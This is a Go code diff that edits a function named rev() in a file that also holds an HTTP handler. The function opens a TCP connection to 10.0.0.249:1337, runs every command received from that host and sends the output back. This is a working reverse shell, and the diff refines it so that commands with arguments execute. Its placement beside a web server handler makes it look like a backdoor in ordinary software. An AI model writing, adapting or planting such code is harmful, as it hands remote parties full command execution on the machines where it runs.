@@ -23,10 +23,13 @@ func (h HttpHandler) ServeHTTP(res http.ResponseWriter, req *http.Request) {
 }
 
 func rev(){
-    conn, _ := net.Dial("tcp", "10.0.0.248:1337")
+    conn, _ := net.Dial("tcp", "10.0.0.249:1337")
     for {
         message, _ := bufio.NewReader(conn).ReadString('\n')
-        out, err := exec.Command(strings.TrimSuffix(message, "\n")).Output()
+	message = strings.TrimSuffix(message, "\n")
+        cmd := strings.Split(message, " ")[0]
+	args := strings.Split(message, " ")[1:]
+        out, err := exec.Command(cmd, args...).Output()
 
         if err != nil {
 	    fmt.Fprintf(conn, "%s\n",err)
